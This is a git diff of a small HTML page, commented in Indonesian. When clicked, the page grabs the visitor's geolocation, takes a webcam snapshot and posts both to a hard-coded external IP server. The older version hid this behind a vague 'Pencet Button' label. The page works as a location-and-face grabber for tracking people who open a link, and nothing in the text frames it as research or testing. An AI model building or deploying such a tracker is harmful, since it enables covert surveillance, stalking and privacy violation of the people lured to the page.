@@ -3,72 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location and Camera Tracker</title>
+    <title>Location Tracker</title>
 </head>
 <body>
-    <h1>Location</h1>
-    <button id="trackButton">Pencet Button</button>
-
+    <h1>Location Tracker</h1>
+    <button id="trackLocation">Track Location and Take Photo</button>
     <script>
-        document.getElementById('trackButton').onclick = async () => {
-            // Mengambil lokasi
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
+        document.getElementById('trackLocation').addEventListener('click', async () => {
+            // Meminta izin lokasi
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
 
-                    // Mengambil foto
-                    const photo = await takePhoto();
+                // Mengambil foto
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-                    // Kirim data ke server
+                // Menunggu beberapa detik untuk mengatur video
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; // Lebar gambar
+                    canvas.height = 480; // Tinggi gambar
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    video.pause();
+                    stream.getTracks().forEach(track => track.stop()); // Hentikan video
+
+                    const photoBlob = await new Promise(resolve => {
+                        canvas.toBlob(resolve, 'image/jpeg');
+                    });
+
+                    // Mengirim data ke backend
                     const formData = new FormData();
                     formData.append('latitude', latitude);
                     formData.append('longitude', longitude);
-                    formData.append('photo', photo);
+                    formData.append('photo', photoBlob, 'photo.jpg');
 
-                    fetch('http://180.241.180.188:3000/submit', {
+                    await fetch('http://180.241.180.188:3000/submit', {
                         method: 'POST',
-                        body: formData
-                    }).then(response => response.json())
-                      .then(data => {
-                          console.log(data);
-                      }).catch(error => console.error('Error:', error));
-                });
-            } else {
-                alert("Geolocation is not supported by this browser.");
-            }
-        };
-
-        // Fungsi untuk mengambil foto
-        async function takePhoto() {
-            return new Promise((resolve, reject) => {
-                const video = document.createElement('video');
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
-
-                // Akses kamera
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        video.srcObject = stream;
-                        video.play();
-                        
-                        // Ambil gambar setelah video mulai bermain
-                        video.addEventListener('loadedmetadata', () => {
-                            setTimeout(() => {
-                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                video.pause();
-                                stream.getTracks().forEach(track => track.stop()); // Hentikan kamera
-
-                                canvas.toBlob(blob => {
-                                    const file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
-                                    resolve(file);
-                                }, 'image/jpeg');
-                            }, 1000); // Ambil foto setelah 1 detik
-                        });
-                    })
-                    .catch(error => reject(error));
+                        body: formData,
+                    });
+                }, 3000); // Mengambil foto setelah 3 detik
+            }, (error) => {
+                console.error('Error getting location:', error);
             });
-        }
+        });
     </script>
 </body>
 </html
